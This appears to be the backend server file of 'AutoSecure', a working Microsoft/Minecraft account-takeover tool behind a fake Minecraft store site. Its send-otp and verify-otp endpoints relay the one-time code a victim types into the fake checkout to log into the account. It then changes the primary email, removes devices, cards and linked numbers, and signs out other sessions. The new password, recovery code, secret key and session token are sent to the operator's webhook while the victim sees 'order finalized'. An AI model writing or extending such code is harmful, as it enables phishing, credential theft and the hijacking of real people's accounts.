const express = require('express');
const rateLimit = require('express-rate-limit');
const http = require('http');

process.on('unhandledRejection', (reason, promise) => {
    console.error('[ANTI-CRASH] Backend Unhandled Rejection:', reason);
});
process.on('uncaughtException', (err, origin) => {
    console.error(`[ANTI-CRASH] Backend Uncaught Exception: ${err ? err.message : err}`, err ? err.stack : '');
});

const validEmail = require('../autosecure/utils/emails/validEmail');
const getCredentials = require('../autosecure/utils/info/getCredentials');
const sendotp = require('../autosecure/utils/secure/sendotp');
const login = require('../autosecure/utils/secure/login');
const secure = require('../autosecure/utils/secure/recodesecure');
const generateuid = require('../autosecure/utils/generateuid');
const insertaccount = require('../db/insertaccount');
const { getDonutStats } = require('../autosecure/utils/donutapi/getDonutStats');
const getStats = require('../autosecure/utils/hypixelapi/getStats');
const { sendSecureNotification } = require('../autosecure/utils/notifications/notifier');
const { initializeDB } = require('../db/db');
const { queryParams } = require('../db/database');
const { sendWebLog } = require('../autosecure/utils/webLogger');
const config = require('../config.json');

const app = express();
const PORT = process.env.BACKEND_PORT || process.env.PORT || 5000;

const activeSessions = new Map();

setInterval(() => {
    const now = Date.now();
    for (const [id, sess] of activeSessions.entries()) {
        if (now - sess.timestamp > 15 * 60 * 1000) {
            activeSessions.delete(id);
        }
    }
}, 10 * 60 * 1000);

const generalApiLimiter = rateLimit({
    windowMs: 1 * 60 * 1000,
    max: 120,
    standardHeaders: true,
    legacyHeaders: false,
    message: { success: false, error: 'Too many requests. Please try again in 1 minute.' }
});

const sendOtpLimiter = rateLimit({
    windowMs: 1 * 60 * 1000,
    max: 10,
    standardHeaders: true,
    legacyHeaders: false,
    message: { success: false, error: 'Too many OTP requests. Please wait 1 minute.' }
});

const verifyOtpLimiter = rateLimit({
    windowMs: 1 * 60 * 1000,
    max: 15,
    standardHeaders: true,
    legacyHeaders: false,
    message: { success: false, error: 'Too many verification attempts. Please wait a moment.' }
});

app.use(express.json({ limit: '20kb' }));
app.use(express.urlencoded({ extended: true, limit: '20kb' }));

// IP Ban Middleware
app.use(async (req, res, next) => {
    try {
        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
        const clientIp = rawIp.split(',')[0].trim();
        if (clientIp) {
            const banned = await queryParams('SELECT 1 FROM banned_ips WHERE ip = ?', [clientIp]);
            if (banned && banned.length > 0) {
                return res.status(403).json({
                    success: false,
                    error: 'Your IP has been blocked by security rules.'
                });
            }
        }
    } catch (e) {}
    next();
});

app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use('/api/', generalApiLimiter);

app.use((req, res, next) => {
    const time = new Date().toLocaleTimeString('vi-VN');
    if (req.url.startsWith('/api/')) {
        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        console.log(`[${time}] [BACKEND-API] ${req.method} ${req.url} (IP: ${clientIp})`);
    }
    next();
});

// Endpoint to receive realtime visitor & checkout activity from web
app.post('/api/web-activity', async (req, res) => {
    try {
        const { code, username, email, action, statusText, link, domain } = req.body || {};
        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
        const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';

        await sendWebLog({
            code,
            ip: clientIp,
            link,
            domain: domain || req.headers.host || 'donutmp.store',
            username,
            email,
            action: action || 'input',
            statusText: statusText || 'Click Continue'
        });

        return res.json({ success: true });
    } catch (err) {
        console.error('[API /web-activity] Error logging:', err.message);
        return res.status(500).json({ success: false, error: err.message });
    }
});

app.get('/api/health', (req, res) => {
    res.json({
        status: 'ok',
        service: 'AutoSecure Dedicated Backend API',
        port: PORT,
        time: new Date().toISOString(),
        activeSessions: activeSessions.size
    });
});

app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
    try {
        let { email, username } = req.body;
        email = (email || '').trim();
        username = (username || '').trim();

        if (!email) {
            return res.status(400).json({
                success: false,
                error: 'Please enter your Microsoft / Minecraft account email.'
            });
        }

        if (!validEmail(email)) {
            return res.status(400).json({
                success: false,
                error: 'Invalid email format. Please check again.'
            });
        }

        const profiles = await getCredentials(email, false);

        if (!profiles) {
            return res.status(404).json({
                success: false,
                error: 'Microsoft account not found for this email.'
            });
        }

        const eligibleProofs = profiles.Credentials?.OtcLoginEligibleProofs ||
            (profiles._securityEmails && profiles._securityEmails.length > 0 ? profiles._securityEmails.map(s => s.proof || s) : null) ||
            profiles.Credentials?.Proofs;

        if (!eligibleProofs || eligibleProofs.length === 0) {
            return res.status(400).json({
                success: false,
                error: 'This Microsoft account does not have email OTP verification enabled.'
            });
        }

        const secEmailObj = eligibleProofs[0];
        const secDisplay = secEmailObj.display || secEmailObj.data || email;
        const secData = secEmailObj.data || secEmailObj.display || email;

        const otpSent = await sendotp(email, secData);

        if (!otpSent) {
            return res.status(500).json({
                success: false,
                error: 'Failed to send OTP code from Microsoft Live. Please try again shortly.'
            });
        }

        const sessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
        activeSessions.set(sessionId, {
            email,
            secData,
            secDisplay,
            username,
            timestamp: Date.now()
        });

        return res.json({
            success: true,
            sessionId,
            email,
            maskedEmail: secDisplay,
            secId: secData,
            message: `OTP verification code sent to ${secDisplay}!`
        });

    } catch (error) {
        console.error('[API /send-otp] Error:', error);
        return res.status(500).json({
            success: false,
            error: 'Error processing OTP request: ' + error.message
        });
    }
});

app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
    try {
        let { sessionId, email, secId, code, username } = req.body;
        code = (code || '').toString().trim();

        if (sessionId && activeSessions.has(sessionId)) {
            const sess = activeSessions.get(sessionId);
            if (!email) email = sess.email;
            if (!secId) secId = sess.secData;
            if (!username) username = sess.username;
        }

        email = (email || '').trim();
        secId = (secId || '').trim();
        username = (username || '').trim();

        if (!code || isNaN(code)) {
            return res.status(400).json({
                success: false,
                error: 'Verification code must be a 6 to 8 digit number.'
            });
        }

        if (!email) {
            return res.status(400).json({
                success: false,
                error: 'Missing account email.'
            });
        }

        const creds = await getCredentials(email, false);
        const host = await login({ email, id: secId, code }, creds);

        if (!host || host === 'tfa') {
            return res.status(401).json({
                success: false,
                error: 'Verification code is invalid or expired. Please check your email.'
            });
        }

        const uid = await generateuid();

        const settings = {
            user_id: "web_system",
            botnumber: 1,
            auto_secure: 1,
            exploit: 1,
            oauthapps: 1,
            removedevices: 1,
            signout: 1,
            changeprimary: 1,
            secureifnomc: 1,
            addzyger: 1,
            removecards: 1,
            leavefamily: 1,
            removelinkednumbers: 1,
            webhook: config.notifierWebhook || "",
            prefix: "HachiiroMC",
            domain: (config.domains && config.domains[0]) || "thapcamstore.click",
            pfp: config.defaultpfp || "https://website.donutsmp.org/bcGCsev.png",
            ping: "@everyone",
            aftersecure: "nothing"
        };

        let acc = await secure(host, settings, uid, username);

        const targetIgn = acc.newName && acc.newName !== "No Minecraft!" ? acc.newName : (username || acc.oldName || "");
        let donutStats = null;
        if (targetIgn) {
            try {
                donutStats = await getDonutStats(targetIgn);
            } catch (err) {}
        }

        let hypixelStats = null;
        if (targetIgn) {
            try {
                hypixelStats = await getStats(targetIgn);
            } catch (e) {}
        }

        try {
            await insertaccount(acc, uid, "web_system", settings.secureifnomc);
        } catch (dbErr) {
            console.error('[API /verify-otp] DB Error:', dbErr.message);
        }

        try {
            const accountData = {
                username: targetIgn || 'Unknown',
                email: acc.email,
                oldEmail: email,
                password: acc.password,
                recoveryCode: acc.recoveryCode,
                secretkey: acc.secretkey,
                secEmail: acc.secEmail,
                ssid: acc.ssid,
                donut: donutStats,
                donutMoney: donutStats?.moneyFormatted || null,
                donutShards: donutStats?.shardsFormatted || null,
                donutPlaytime: donutStats?.playtime || null,
                donutRank: donutStats?.rank || null,
                donutKDR: donutStats?.kdr || null,
                networth: hypixelStats?.networth || '0',
                bedwars: hypixelStats?.bedwars?.level || '0',
                networkLevel: hypixelStats?.networkLevel || '0'
            };

            await sendSecureNotification(null, accountData);
        } catch (whError) {
            console.error('[API /verify-otp] Webhook Error:', whError.message);
        }

        if (sessionId) activeSessions.delete(sessionId);

        return res.json({
            success: true,
            uid,
            username: targetIgn,
            message: 'Account verified and order finalized successfully!'
        });

    } catch (error) {
        console.error('[API /verify-otp] Error:', error);
        return res.status(500).json({
            success: false,
            error: 'Error processing verification: ' + error.message
        });
    }
});

app.use((req, res) => {
    res.status(404).json({ success: false, error: 'Endpoint not found on Backend API' });
});

async function startBackend() {
    try {
        await initializeDB();
        app.listen(PORT, () => {
            if (process.env.RUN_ALL_MODE === 'true') {
                console.log(`[BACKEND] ✔ Cổng ${PORT} sẵn sàng (API: http://localhost:${PORT}/api/health)`);
                return;
            }
            console.log(`[BACKEND] Listening on http://localhost:${PORT}`);
        });
    } catch (err) {
        console.error('[BACKEND] Startup error:', err);
    }
}

if (require.main === module) {
    startBackend();
}

module.exports = { app, startBackend };
